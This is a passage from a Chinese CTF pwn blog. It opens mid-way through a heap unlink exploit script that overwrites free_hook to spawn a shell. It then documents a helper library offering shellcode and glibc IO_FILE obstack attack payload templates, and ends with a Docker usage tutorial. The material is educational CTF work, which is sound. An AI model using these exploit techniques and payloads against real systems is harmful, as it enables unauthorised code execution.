class="number">14</span>),<span class="number">16</span>)-<span class="number">0x1200</span></span><br><span class="line">log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line">ptr=base_addr+<span class="number">0x202070</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">&#x27;aaaabbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">&#x27;ccccdddd&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x98</span>,<span class="string">&#x27;eeeeffff&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x98</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,fake_chunk+<span class="number">0x70</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;\xa0&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">free_hook=libc_base_addr+<span class="number">0x3c67a8</span> </span><br><span class="line">sys_addr=libc_base_addr+<span class="number">0x0000000000045390</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(free_hook)+p64(<span class="number">0x20</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007182508865.png" alt="image-20221007182508865"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/ad411136.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/ad411136.html" class="post-title-link" itemprop="url">tools-函数库</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:48:08" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%B0%9D%E8%AF%95%E5%BC%80%E5%8F%91%E5%B0%8F%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">尝试开发小工具</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>我和我的同学 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/trunk/">trunk</a> 写了一些方便解PWN题的<del>鸡肋</del>函数封装到了这个库里，第一是平常用起来方便顺手，第二顺便练习下编程能力，第三如果以后有可能的话，希望逐渐做成像 <strong>roderick</strong> 师傅的<a target="_blank" rel="noopener" href="https://github.com/RoderickChan/pwncli">pwncli</a>那样。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ZIKH26/tools/blob/master/tools.py">源代码</a></p>
<p>一条命令下载 <code>tools</code> 函数库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/ZIKH26/tools/master/tools.py</span><br></pre></td></tr></table></figure>



<p><strong><code>tools</code> 库只支持python3</strong></p>
<h2 id="命令行参数："><a href="#命令行参数：" class="headerlink" title="命令行参数："></a>命令行参数：</h2><p>为了不在打远程和本地，以及打本地时是否开启调试选择中来不断的更改脚本，因此我设置了命令行参数来直接做切换。</p>
<p>1 去打远程且不开启脚本中的调试</p>
<p>2 打本地且不开启脚本中的调试</p>
<p>如果不加命令行参数，则默认打本地，若有debug函数则自动开启调试。</p>
<p>假设你现在想打远程</p>
<p>那么你需要在脚本里写<code>p,e,libc=load(&quot;heap&quot;,&quot;node4.buuoj.cn:27339&quot;)</code> (程序名和ip&amp;port请自行更改，这里只是举例说明)</p>
<p>然后运行脚本时使用命令 如下(即使脚本中有debug函数也不影响打远程)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 exp.py 1</span><br></pre></td></tr></table></figure>

<p>如果打本地时，不想去让脚本执行debug函数，那么命令可以如下(这样的好处是即使脚本中存在debug函数，但不想在本次执行脚本时debug也不需要来回去脚本里注释了)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exp.py 2</span><br></pre></td></tr></table></figure>

<p><strong>如果直接运行exp.py的话，即使脚本里存在ip和port也不会去打远程</strong></p>
<p>此外，假设你打本地所依赖的libc是2.23-0ubuntu11.3版本 而远程服务器程序所依赖的libc是2.23-0ubuntu11版本。二者仅仅是小版本有细微的不同，可能one_gadget和一些libc里函数的偏移有点不同，如果来回去修改的话，有点麻烦，因此在load函数的第三个参数可以设置远程依赖的libc，这样用后面search_og函数或者libc.symbols找的函数地址都会自动切换到远程所依赖的libc。</p>
<p>示例如下:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29026&quot;</span>,<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="各个函数的使用说明"><a href="#各个函数的使用说明" class="headerlink" title="各个函数的使用说明"></a>各个函数的使用说明</h2><h3 id="long-search-amp-local-search"><a href="#long-search-amp-local-search" class="headerlink" title="long_search&amp;local_search"></a>long_search&amp;local_search</h3><p>作用：这两个函数就是去libc中寻找system函数和&#x2F;bin&#x2F;sh的地址（分别用于本地和远程）<br>优点：将用LibcSearcher搜索并装载的重复的代码都放到了函数内部，现在一行就可以获取system和&#x2F;bin&#x2F;sh地址，因此您的脚本看起来更为简洁。</p>
<p>使用范例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr,libc)</span><br><span class="line"><span class="string">&quot;&quot;&quot;libc指的是装载本地的libc,例如在脚本开始声明&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p>作用：这个函数就是单纯的打印一下某些变量的信息，类似于日志（但我更建议去使用下面的log_addr函数）<br>优点：加了箭头和字体颜色效果，可以更清楚的打印所需要的信息</p>
<p>使用范例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts=<span class="number">123456</span></span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,puts_addr)</span><br></pre></td></tr></table></figure>

<h3 id="log-addr"><a href="#log-addr" class="headerlink" title="log_addr"></a>log_addr</h3><p>如果你仅仅是想看一下变量对应的值是否是你需要的那个地址，同时感觉上面这个log函数太麻烦还需要两个参数，那么你不妨试试log_addr函数。</p>
<p>作用:log_addr是专门为展示地址设计的（因为它会自动将变量以16进制的形式打印)</p>
<p>优点：<strong>只传一个变量名字即可同时返回的是以十六进制表示的变量</strong>，但是没有log函数灵活。</p>
<p>使用前提：你要确保变量是int类型的，那么你仅仅传入**字符型的<u>变量名字</u>**（不是变量）</p>
<p>使用范例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts_addr=123456</span><br><span class="line">log_addr(&#x27;puts_addr&#x27;)</span><br></pre></td></tr></table></figure>

<p>使用效果：<br><img src="/../img/MRYBXkvlcL5Kj6t.png"></p>
<h3 id="log-info"><a href="#log-info" class="headerlink" title="log_info"></a>log_info</h3><p>如果仅仅是打印一个参数的话，可以使用log_info函数。</p>
<p>作用：打印调试信息</p>
<p>优点：前面加了[*]，使调试信息更加明显，让你更快的找到你想看见的信息。</p>
<p>适用情况：比如你发现u32(p.recv(4))得到的地址不对，你想要看看p.recv()到底接收了什么，那么你就可以这么写log_info(p.recv())。</p>
<p>使用范例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log_info(p.recv())</span><br></pre></td></tr></table></figure>

<p>使用效果：</p>
<p><img src="/../img/jP81hQByfWJlrTH.png" alt="image-20220729201555971"></p>
<h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>作用：在脚本中下断点进行调试<br>优点：1、如果使用tmux，可以直接分三屏，效果如下图。您仅仅只需要在脚本中加入这个函数，运行脚本的时候就可以自动分出三块屏幕(调试具体信息占屏幕的右侧，左上是脚本的debug执行信息，左下则可以继续使用)，左下角的区域完全可以去对着脚本进行调试。<br><img src="/../img/7cIP89qwUyT2umG.png"></p>
<p>2、可以很简洁的输入地址，即可完成下断点的工作，同时开了pie保护的话，也可以正常去下断点</p>
<p>使用说明：<br>        这个函数还是比较常用的，适用于tmux的终端，只需要在最开始传递一下process函数返回的对象，接着就可以直接下断点了（默认使用tmux），如果开启了PIE保护的话，需要声明一下pie（也就是加一个参数’pie’）即可继续下断点。<br>        如果不使用tmux也没问题，可以加入参数no-tmux就可以正常使用这个函数（<strong>如果使用no-tmux，则这个参数必须是放在第二个参数的位置</strong>（第一个参数始终是process的返回值）</p>
<p>如果直接使用debug()函数，参数只有process函数返回的对象的话，则默认使用tmux终端，执行分三屏命令，最后执行gdb.attach(p)<br>PS：这个函数可以放到脚本的任何位置（必须要保证当前位置的下面还有一行不会触发报错的代码），这样可以从脚本当前的位置去开始调试，同时配合下的断点可以使调试更高效。<br>使用范例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">debug(p,<span class="number">0x400ECD</span>,<span class="number">0x400F54</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;使用tmux，下两个断点&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;no-tmux&#x27;</span>,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x248</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;不使用tmux，程序开了pie，用偏移来下断点&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">debug(p)</span><br><span class="line"><span class="string">&quot;&quot;&quot;使用tmux，执行gdb.attach(p)&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><p>作用:写入目标程序的名字，将返回p(process的返回值),e(当前ELF文件的信息),libc(ELF文件所依赖的libc文件的信息)。ps：如果是静态链接的程序，那么只会执行p&#x3D;process或者p&#x3D;remote然后直接返回p。</p>
<p>也就是相当于执行了原来的p&#x3D;process(‘xxx’) e&#x3D;ELF(‘xxx’) libc&#x3D;ELF(‘xxx’)。如果传入了ip和port的话，则会执行remote(ip,port)代替原本的process。这样就可以直接打远程了</p>
<p>优点:将原本重复的代码写在了函数内部，现在只要调用load函数，传入函数名即。同时该函数也获取了libc的信息将其存为了全局变量，为了之后获取one_gadget的函数直接使用。</p>
<p>使用范例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p,e,libc=load(<span class="string">&#x27;program&#x27;</span>)<span class="comment">#这是打本地，动态链接的程序</span></span><br><span class="line">p=load(<span class="string">&#x27;program&#x27;</span>)<span class="comment">#这是打本地，静态链接的程序</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;program&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28822&quot;</span>)<span class="comment">#这是打远程的情况，ip和port只需要用:分隔开即可。</span></span><br></pre></td></tr></table></figure>




<h3 id="shellcode-store"><a href="#shellcode-store" class="headerlink" title="shellcode_store"></a>shellcode_store</h3><p>我封装了一些shellcode放到了tools里面，可以使用shellcode_store函数来进行使用。</p>
<p>作用：参数设置为需要的shellcode类型，返回对应的shellcode</p>
<p>使用范例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode=shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>)<span class="comment">#返回64位获取shell的shellcode</span></span><br><span class="line">shellcode=shellcode_store(<span class="string">&#x27;orw_32&#x27;</span>)<span class="comment">#返回32位执行open,read,write读出flag的shellcode</span></span><br><span class="line">shellcode=shellcode_store(<span class="string">&#x27;str_rax&#x27;</span>)<span class="comment">#返回起始的跳转寄存器为rax的字符型shellcode</span></span><br></pre></td></tr></table></figure>

<p>PS：获取shell和orw的我都写了64位和32位的shellcode（应该是最短字节的了），纯字符的shellcode我几乎只生成了针对于x64的各个寄存器，其他没有生成那么多（因为感觉平常很少用到），等以后用到没有生成过的再记录上来吧。</p>
<h3 id="search-og"><a href="#search-og" class="headerlink" title="search_og"></a>search_og</h3><p>作用：不需要手动将one_gadget工具获取的one_gadget再复制粘贴到脚本中了，可以直接通过这个函数来获取one_gadget,参数为想获取对应的one_gadget在列表中的索引。</p>
<p>注意:这个函数依赖了one_gadget这个工具以及load函数，因此必须要保证当前拥有one_gadget工具并且脚本中使用了load函数才行。</p>
<p>使用范例:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">one_gadget=search_og(<span class="number">1</span>)</span><br><span class="line">p.sendline(p64(one_gadget+libc_base))</span><br></pre></td></tr></table></figure>

<p>使用效果：<br><img src="/../img/2706180-20220821171240306-943254837.png"></p>
<h3 id="攻击模板"><a href="#攻击模板" class="headerlink" title="攻击模板"></a>攻击模板</h3><h4 id="obstack-attack"><a href="#obstack-attack" class="headerlink" title="obstack_attack"></a>obstack_attack</h4><p>作用: 这个函数是提前布局好的一个 <code>IO_FILE</code> 模板（打的 <code>IO</code> 链是 <code>IO_obstack_jumps</code> 中 <code>_IO_obstack_xsputn</code> 函数），攻击效果可以任意地址执行并且可以控制第一个参数,这个函数的最终效果是执行 <code>system(&quot;/bin/sh&quot;)</code></p>
<p>适用版本: <code>glibc 2.36</code>及以下</p>
<p>利用条件:使用前提是泄露 <code>libc</code> 地址和堆地址 并且能任意地址写一个堆地址(最好是往 <code>IO_list_all</code> 里写一个堆地址) 且能从 <code>main</code> 函数正常返回或者触发 <code>exit</code> 函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dirc=&#123; <span class="string">&#x27;system&#x27;</span>:libc_base+<span class="number">0x50d60</span> ,<span class="string">&#x27;io_obstack_jumps&#x27;</span>:libc_base+xxx&#125;</span><br><span class="line">libc_symbols=create_dict(dirc)</span><br><span class="line"></span><br><span class="line">payload=obstack_attack(heap_addr,libc_symbols)</span><br></pre></td></tr></table></figure>

<p>使用方法: <code>heap_addr</code> 是写入 <code>IO_list_all</code> 中的堆地址( <code>chunk</code> 头地址)<br><code>libc_symbols</code> :是 <code>create_dict(dict)</code> 传入进来返回值（ <code>dirc</code> 是所需的参数字典）</p>
<p>返回值是构造好的 <code>payload</code></p>
<h4 id="obstack-orw1-attack"><a href="#obstack-orw1-attack" class="headerlink" title="obstack_orw1_attack"></a>obstack_orw1_attack</h4><p>作用：这个函数就是在禁用了 <code>execve</code> 或者栈没对齐时使用的,攻击效果就是执行常规的 <code>orw</code>,和<code>obstack_attack</code> 不同的就是字典中多了几个成员</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dirc=&#123;<span class="string">&#x27;io_obstack_jumps&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;open&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;read&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;write&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;svcudp_reply&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;add_rsp&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;leave_ret&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rsi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdx_xxx&#x27;</span>:libc_base+xxx &#125;</span><br><span class="line"></span><br><span class="line">libc_symbols=create_dict(dirc) </span><br><span class="line">payload=obstack_attack(heap_addr,libc_symbols)</span><br></pre></td></tr></table></figure>

<p>使用方法: <code>heap_addr</code> 是写入 <code>IO_list_all</code> 中的堆地址( <code>chunk</code> 头地址)<br><code>libc_symbols</code> :是 <code>create_dict(dict)</code> 传入进来返回值（ <code>dirc</code> 是所需的参数字典）</p>
<p>返回值是构造好的 <code>payload</code></p>
<h4 id="obstack-orw2-attack"><a href="#obstack-orw2-attack" class="headerlink" title="obstack_orw2_attack"></a>obstack_orw2_attack</h4><p>这个是上一个的升级版,区别就是将 <code>open</code> 换成了 <code>openat</code> （有时候可能沙箱会禁用掉 <code>open</code>）,并且关闭标准输入流，将文件描述符 <code>0</code>  作为 <code>flag</code> 文件的文描述符,避免本地通了，远程打不通</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dirc=&#123;<span class="string">&#x27;io_obstack_jumps&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;openat&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;close&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;read&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;write&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;svcudp_reply&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;add_rsp&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;leave_ret&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rsi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdx_xxx&#x27;</span>:libc_base+xxx &#125;</span><br><span class="line">libc_symbols=create_dict(dirc)</span><br><span class="line">payload=obstack_attack(heap_addr,libc_symbols)</span><br></pre></td></tr></table></figure>

<p>使用方法: <code>heap_addr</code> 是写入 <code>IO_list_all</code> 中的堆地址( <code>chunk</code> 头地址)<br><code>libc_symbols</code> :是 <code>create_dict(dict)</code> 传入进来返回值（ <code>dirc</code> 是所需的参数字典）</p>
<p>返回值是构造好的 <code>payload</code></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/80648483.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/80648483.html" class="post-title-link" itemprop="url">对docker学习进行的小总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:47:42" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" itemprop="url" rel="index"><span itemprop="name">环境搭建</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>因为打CTF pwn题的时候，经常遇见本地程序的libc与远程服务器那边程序所依赖的libc不匹配的情况，尽管可以用patchelf和glibc-all-in-one来给程序patch一个libc。但是patchelf似乎有点小bug，为了防止比赛的时候在这个地方掉链子，因此可以采用在docker里跑不同版本的ubuntu。</p>
<p>同时随着时间的推移，自己也从一个拉跨的做题人偶尔客串了一下拉跨的出题人，因此需要打包一个题目环境，还得学习一下docker的几个基本配置文件。</p>
<p>本文是对我学习docker做了一个简单的小总结。</p>
<h3 id="docker-容器-镜像"><a href="#docker-容器-镜像" class="headerlink" title="docker 容器 镜像"></a>docker 容器 镜像</h3><p>Docker是一个开源的容器编排工具，它允许开发人员在自己的计算机上打包和运行应用程序。</p>
<p>容器是一种轻量级的虚拟化技术，它允许在单个操作系统中运行多个隔离的应用程序。容器运行时会在镜像的基础上创建一个可写层，而镜像本身是只读的。</p>
<p>镜像是容器运行时所需要的文件系统，它包含了容器运行时需要的所有软件，配置文件和环境变量等。镜像是静态的，不能运行命令，只能被用来创建容器。</p>
<p>总之，Docker是一种工具，容器是运行在Docker上的一种虚拟化技术，镜像是容器运行所需要的文件系统。</p>
<h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><p>一条命令安装docker:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>

<p>如果没有安装curl的话，先安装curl:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install curl</span><br></pre></td></tr></table></figure>

<h2 id="ubuntu不同版本对应默认libc："><a href="#ubuntu不同版本对应默认libc：" class="headerlink" title="ubuntu不同版本对应默认libc："></a>ubuntu不同版本对应默认libc：</h2><blockquote>
<p>需要什么版本libc，接下来下载对应的版本镜像即可</p>
<p>22.04—-&gt;2.35-0ubuntu3</p>
<p>21.04—-&gt;2.33-0ubuntu5</p>
<p>20.04—-&gt;2.31-0ubuntu9.7</p>
<p>21.10—-&gt;2.34-0ubuntu3.2</p>
<p>18.04—-&gt;2.27-3ubuntu1.5</p>
</blockquote>
<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p>roderick师傅编译了很多版本的镜像,在下面这个链接下载(使用roderick师傅的镜像，运行起来的容器里面要用gdb.attach的话，需要指定终端tmux，roderick师傅把一些快捷键给改了，具体请在容器里输入cat ~&#x2F;.tmux.conf 来查看）</p>
<p><a target="_blank" rel="noopener" href="https://hub.docker.com/r/roderickchan/debug_pwn_env/tags">https://hub.docker.com/r/roderickchan/debug_pwn_env/tags</a></p>
<p><img src="/../img/2706180-20220516184739994-1663794444.png"></p>
<p>点这个，然后直接粘到虚拟机上就开始下载了（注意权限问题）。</p>
<p>我简单说一下这个docker是咋用的</p>
<blockquote>
<p>刚刚下载下来的镜像，要实例化成容器（也就是让容器运行起来）。当容器运行起来之后，我们就相当于有了”另一个版本的ubuntu”。如果你想退出它可以用exit，此时它依然是运行状态，如果你停止了一个容器，那么此时它处于停止状态，不过不管是你exit还是stop还是关机，容器依然存在（里面你新下载的文件也存在），可以使用start开启停止状态的容器，如果删除了容器，则里面你新下载的文件会消失（容器原本的文件不会消失）</p>
</blockquote>
<h2 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search 关键字</span><br></pre></td></tr></table></figure>


<p>使用docker search命令搜索官房仓库中的共享镜像。</p>
<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>对于Docker镜像来说，如果下载镜像时不指定标签，默认会下载仓库中最新版本的镜像，即选择<br>标签latest。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull 仓库名称[:标签]</span><br></pre></td></tr></table></figure>



<h2 id="查看镜像或者容器"><a href="#查看镜像或者容器" class="headerlink" title="查看镜像或者容器"></a>查看镜像或者容器</h2><p>查看所有容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker ps -a</span><br></pre></td></tr></table></figure>

<p>查看正在运行的容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker ps</span><br></pre></td></tr></table></figure>

<p>查看已有镜像：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure>

<h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><p>这意味着是在把一个镜像给实例化（除非删除，不然启动的容器不会消失（即使主机重启,或者输入stop，或者exit）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker run -it IMAGE ID /bin/bash</span><br></pre></td></tr></table></figure>

<p>启动已停止的容器(启动被stop暂停的容器)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker start  CONTAINER ID</span><br></pre></td></tr></table></figure>

<h2 id="进入容器-amp-amp-退出容器"><a href="#进入容器-amp-amp-退出容器" class="headerlink" title="进入容器&amp;&amp;退出容器"></a>进入容器&amp;&amp;退出容器</h2><p>进入容器的前提是容器必须启动（也就是用docker ps可以看到容器)，如果容器处于了停止状态，需要用docker start将其启动，然后再进入容器.</p>
<p>下面两个命令都可以进入容器，二者区别在于前者使用之后执行exit会顺便把容器停止，而后者执行exit，容器依然在运行。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker attach  CONTAINER ID</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it CONTAINER ID /bin/bash</span><br></pre></td></tr></table></figure>

<p>如果要以root权限进入容器的话，命令如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it -u root CONTAINER ID /bin/bash</span><br></pre></td></tr></table></figure>

<p><strong>退出容器执行<code>exit</code>即可，只要容器被启动，则输入上述命令就能再次进入。</strong></p>
<h2 id="删除镜像或者容器"><a href="#删除镜像或者容器" class="headerlink" title="删除镜像或者容器"></a>删除镜像或者容器</h2><p>删除指定的容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker rm -f CONTAINER ID</span><br></pre></td></tr></table></figure>

<p>删除指定的镜像（删除镜像之前需要先停止容器，然后先删容器后删镜像）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker rmi IMAGE ID</span><br></pre></td></tr></table></figure>

<p>下面的命令可以清理掉所有处于终止状态的容器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker container prune</span><br></pre></td></tr></table></figure>

<p>删除所有镜像(如果被实例化的镜像是不能删除的)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker system prune -a</span><br></pre></td></tr></table></figure>

<h2 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h2><p>请注意停止容器和删除容器的区别：停止容器，仅仅是用docker ps查看不到了（因为他不再运行了，但它依然存在，只不过属于停止状态，用docker ps -a可以查看到）</p>
<p>停止容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker stop CONTAINER ID</span><br></pre></td></tr></table></figure>

<h2 id="将文件从主机复制到docker"><a href="#将文件从主机复制到docker" class="headerlink" title="将文件从主机复制到docker"></a>将文件从主机复制到docker</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker cp file CONTAINER ID:Destination_directory</span><br></pre></td></tr></table></figure>

<h2 id="挂载命令"><a href="#挂载命令" class="headerlink" title="挂载命令"></a>挂载命令</h2><p>可以通过挂载的方式来让宿主机和Docker直接来共享文件。（下面这个方法只适用于创建新的容器时同时创建共享目录，不适于后期添加共享目录）</p>
<p>创建容器时执行Docker Volume</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -itd --volume /tmp/source:/tmp/destination --name test ubuntu/nginx bash</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker run -it --volume /home/hacker/Desktop/ROPgadget:/home/roderick/ROPgadget --name test roderickchan/debug_pwn_env:22.04</span><br></pre></td></tr></table></figure>

<p>解释:将本机上的ROPgadget文件复制到容器里面,命名为test。</p>
<p>本人也只是刚开始接触docker的使用，如果上述理解又什么问题，欢迎各位师傅斧正，如果以后用到了docker的其他用法，我会更新这篇文章。</p>
<p>下面为后来的更新部分：</p>
